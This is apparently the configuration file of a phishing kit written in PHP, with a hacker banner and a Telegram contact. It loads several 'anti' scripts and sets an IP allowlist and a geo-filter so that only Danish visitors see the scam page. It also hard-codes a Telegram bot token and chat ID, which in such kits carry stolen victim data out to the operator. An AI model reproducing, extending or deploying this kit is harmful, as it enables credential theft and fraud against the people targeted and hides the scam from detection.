<?php

/*

██████╗  █████╗ ██╗  ██╗███████╗██████╗ 
██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██████╔╝███████║█████╔╝ █████╗  ██████╔╝
██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██████╔╝██║  ██║██║  ██╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ https://t.me/BAK34_TMW
                                                                                              
*/



include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";

$allowed_ips = ["IP_ADDRESS_1", "IP_ADDRESS_2", "IP_ADDRESS_3"]; //ip li bghiti ichofo scama
$blocker = "on"; // on = users blocked, off = users not blocked, on = li mn denmark bo7dhom li ychofo scama, off = ga3 lboldan ichofo scama

$token = "7369990453:AAFaKHzFgzjHg_N5l43tR-kX8hwnlphlhko";
$chatid = "-4236088352";

?>